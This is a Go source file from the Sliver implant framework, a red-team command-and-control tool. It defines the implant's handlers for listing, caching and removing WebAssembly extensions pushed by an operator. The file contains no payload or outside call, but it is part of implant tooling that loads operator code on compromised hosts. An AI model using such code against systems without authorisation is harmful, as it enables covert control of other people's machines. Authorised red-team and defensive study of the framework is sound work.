package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2023  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}

	"log"

	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

// *** RPC Handlers ***

func listWasmExtensionsHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Printf("List Wasm extensions ...")
	// {{end}}

	names := []string{}
	for name := range tunnel_handlers.WasmExtensionCache {
		names = append(names, name)
	}
	wasmExt, _ := proto.Marshal(&pb.ListWasmExtensions{Names: names, Response: &commonpb.Response{}})
	resp(wasmExt, nil)
}

// registerWasmExtensionHandler - Load a Wasm extension
func registerWasmExtensionHandler(data []byte, resp RPCResponse) {
	wasmExtReq := &pb.RegisterWasmExtensionReq{}
	err := proto.Unmarshal(data, wasmExtReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	// {{if .Config.Debug}}
	log.Printf("Registering Wasm extension: %s (%d bytes)", wasmExtReq.Name, len(wasmExtReq.WasmGz))
	// {{end}}

	// Cache the Wasm extension in the map until we receive a
	// MsgExecWasmExtensionReq message
	tunnel_handlers.WasmExtensionCache[wasmExtReq.Name] = wasmExtReq

	// {{if .Config.Debug}}
	log.Printf("*** Wasm extensions cache ***")
	for name := range tunnel_handlers.WasmExtensionCache {
		log.Printf(" - %s", name)
	}
	// {{end}}

	wasmExt, _ := proto.Marshal(&pb.RegisterWasmExtension{Response: &commonpb.Response{}})
	resp(wasmExt, nil)
}

// deregisterWasmExtensionHandler - Unload a Wasm extension
func deregisterWasmExtensionHandler(data []byte, resp RPCResponse) {
	wasmExtReq := &pb.DeregisterWasmExtensionReq{}
	err := proto.Unmarshal(data, wasmExtReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	// Remove the Wasm extension from the map
	errMsg := ""
	if _, ok := tunnel_handlers.WasmExtensionCache[wasmExtReq.Name]; ok {
		delete(tunnel_handlers.WasmExtensionCache, wasmExtReq.Name)
	} else {
		errMsg = "Wasm extension not registered"
	}
	wasmExt, _ := proto.Marshal(&pb.RegisterWasmExtension{
		Response: &commonpb.Response{Err: errMsg},
	})
	resp(wasmExt, nil)
}
